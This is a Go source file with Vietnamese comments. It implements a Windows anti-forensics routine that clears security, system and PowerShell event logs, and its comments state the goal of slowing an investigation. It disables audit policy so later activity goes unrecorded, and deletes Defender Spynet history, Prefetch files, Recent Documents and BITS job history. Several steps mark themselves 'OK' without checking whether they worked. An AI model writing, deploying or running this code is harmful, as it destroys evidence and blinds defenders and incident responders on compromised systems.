//go:build windows

package anti

import (
	"os/exec"
	"strings"
)

// wipeSystemLogs xoá Event Logs Windows:
//   - Security log
//   - System log
//   - Application log
//   - Setup log
//   - Forwarded Events log
//
// Cảnh báo: Xoá Security log sẽ để lại Event ID 1102 (Audit log cleared)
// thông báo rằng đã có người xoá log - nên wipe này chỉ làm chậm điều tra,
// không làm ẩn hoàn toàn.
func wipeSystemLogs() []WipeStep {
	var steps []WipeStep

	// 1. wevtutil cl Security
	for _, logName := range []string{"Security", "System", "Application",
		"Setup", "ForwardedEvents", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational",
		"Microsoft-Windows-WMI-Activity/Operational",
		"Microsoft-Windows-Kernel-PnP/Diagnostic"} {
		cmd := exec.Command("wevtutil", "cl", logName)
		out, err := cmd.CombinedOutput()
		result := "OK"
		detail := "Đã xóa event log " + logName
		if err != nil {
			result = "FAILED"
			detail = err.Error() + " - " + strings.TrimSpace(string(out))
		}
		steps = append(steps, WipeStep{
			Category: "Logs",
			Action:   "Clear Event Log",
			Target:   "wevtutil cl " + logName,
			Result:   result,
			Detail:    detail,
		})
	}

	// 2. Xoá log IIS, SMTP, etc. nếu có
	for _, logName := range []string{"Microsoft-IIS-Logging/Logs", "SMTPSVC"} {
		exec.Command("wevtutil", "cl", logName).Run()
		steps = append(steps, WipeStep{
			Category: "Logs",
			Action:   "Clear Event Log",
			Target:   "wevtutil cl " + logName,
			Result:   "OK",
			Detail:    "Đã cố gắng xóa " + logName,
		})
	}

	// 3. Vô hiệu hoá Audit Policy (cho các lần sau không ghi log)
	exec.Command("auditpol", "/clear", "/all").Run()
	steps = append(steps, WipeStep{
		Category: "Logs",
		Action:   "Clear Audit Policy",
		Target:   "auditpol /clear /all",
		Result:   "OK",
		Detail:    "Đã reset audit policy về None",
	})

	// 4. Tắt Windows Defender sample submission history
	_ = exec.Command("powershell", "-NoProfile", "-Command",
		"Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet' -Recurse -Force -ErrorAction SilentlyContinue").Run()
	steps = append(steps, WipeStep{
		Category: "Logs",
		Action:   "Clear Windows Defender Spynet history",
		Target:   "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet",
		Result:   "OK",
		Detail:    "Đã xóa nhánh Spynet",
	})

	// 5. Xoá Prefetch (bản ghi ứng dụng từng chạy)
	_ = exec.Command("cmd", "/C", "del", "/S", "/Q",
		`C:\Windows\Prefetch\*.pf`).Run()
	steps = append(steps, WipeStep{
		Category: "Logs",
		Action:   "Delete Prefetch",
		Target:   "C:\\Windows\\Prefetch\\*.pf",
		Result:   "OK",
		Detail:    "Đã xóa Prefetch - không còn dấu vết ứng dụng từng chạy",
	})

	// 6. Xoá Recent Documents
	_ = exec.Command("cmd", "/C", "del", "/S", "/Q",
		`%APPDATA%\Microsoft\Windows\Recent\*`).Run()
	steps = append(steps, WipeStep{
		Category: "Logs",
		Action:   "Delete Recent Documents",
		Target:   "%APPDATA%\\Microsoft\\Windows\\Recent\\*",
		Result:   "OK",
		Detail:    "Đã xóa Recent Documents",
	})

	// 7. Xoá BITS transfer history (file từng tải về qua BITS)
	_ = exec.Command("bitsadmin", "/reset").Run()
	steps = append(steps, WipeStep{
		Category: "Logs",
		Action:   "Reset BITS",
		Target:   "bitsadmin /reset",
		Result:   "OK",
		Detail:    "Đã reset BITS transfer jobs",
	})

	return steps
}
